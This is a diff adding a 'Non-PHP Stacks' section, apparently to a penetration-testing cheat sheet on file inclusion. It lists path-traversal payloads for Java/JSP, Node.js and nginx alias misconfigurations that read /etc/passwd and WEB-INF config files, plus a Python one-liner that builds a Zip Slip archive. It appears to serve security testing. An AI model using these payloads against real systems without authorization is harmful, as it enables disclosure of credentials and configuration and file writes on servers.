@@ -127,6 +127,39 @@ python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
 # Use output as inclusion parameter value
 ```
 
+## Non-PHP Stacks
+
+### Java / JSP
+```
+?page=../../../WEB-INF/web.xml          # framework config disclosure (servlet mappings, security constraints)
+?page=../../../WEB-INF/classes/application.properties
+# JSP include via forward/dispatcher parameters instead of file params:
+?view=../../../WEB-INF/applicationContext.xml
+```
+Java rarely exposes classic RFI (no `allow_url_include` equivalent), but `RequestDispatcher.forward()`/`include()` built from user input is functionally the same class of bug — confirm the sink is a dispatcher call, not just a `File`/`Path` read.
+
+### Node.js / Express
+```
+?page=..%2f..%2f..%2fetc%2fpasswd
+?page=....%2f%2f....%2f%2fetc%2fpasswd            # bypass naive single-pass `../` string replacement (strips once, leaves a working sequence)
+?page=/etc/passwd%00.html                          # null-byte-style suffix confusion in older Node file-serving middleware
+```
+`path.join()`/`path.normalize()` collapse `../` sequences, but a bug in the app's OWN pre-check (e.g., checking `path.indexOf('..')` before, not after, a decode step) can still leave a bypass — test `..%2f` and double-URL-encoded variants against `express.static`-style routes just like the PHP double-encoding case.
+
+### Web Server Misconfiguration (no app-level LFI parameter needed)
+```
+# nginx alias traversal: `location /files { alias /var/www/files/; }` (missing trailing slash on alias target)
+GET /files../../../etc/passwd HTTP/1.1
+```
+Any reverse-proxy `alias` directive missing a matching trailing slash on the `location` block is traversable directly — this is a config bug independent of the application and should be tested even when no `page=`/`file=` parameter exists in the app itself.
+
+### Zip Slip (archive-extraction path traversal)
+```
+# Craft a zip/tar entry with a traversal filename, then trigger server-side extraction (upload-and-unzip feature)
+python3 -c "import zipfile; z=zipfile.ZipFile('slip.zip','w'); z.writestr('../../../../tmp/pwned.txt','pwned'); z.close()"
+```
+Applies to any upload feature that extracts an archive server-side (avatar theme packs, plugin installers, backup restore) without sanitizing entry paths — chain with `file-upload-testing` for the upload step.
+
 ## Remote File Inclusion (requires allow_url_include=On)
 
 ```
